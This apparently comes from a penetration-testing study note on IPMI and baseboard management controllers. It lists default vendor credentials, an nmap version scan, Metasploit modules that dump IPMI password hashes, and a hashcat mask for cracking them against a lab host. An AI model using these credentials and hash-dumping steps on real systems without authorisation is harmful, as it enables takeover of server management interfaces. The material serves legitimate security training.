---
tags: [basics, protocol, ipmi]
---



- Port 623 (UDP)
- Systems that use IPMI are called Baseboard Management Controllers (BMCs)

**Default credentials**

| Product | Username | Password |
| ------- | -------- | -------- |
| Dell iDRAC | `root` | `calvin` |
| HP iLO | `Administrator` | randomized 8-character string (numbers + uppercase letters) |
| Supermicro IPMI | `ADMIN` | `ADMIN` |

### Footprinting 

```bash
sudo nmap -sU --script ipmi-version -p 623 ilo.inlanefreight.local

# Using Metasploit 
use auxiliary/scanner/ipmi/ipmi_version

# Metasploit to dump hashes
use auxiliary/scanner/ipmi/ipmi_dumphashes

# Using hashcat to crack the hashes 
hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u

```

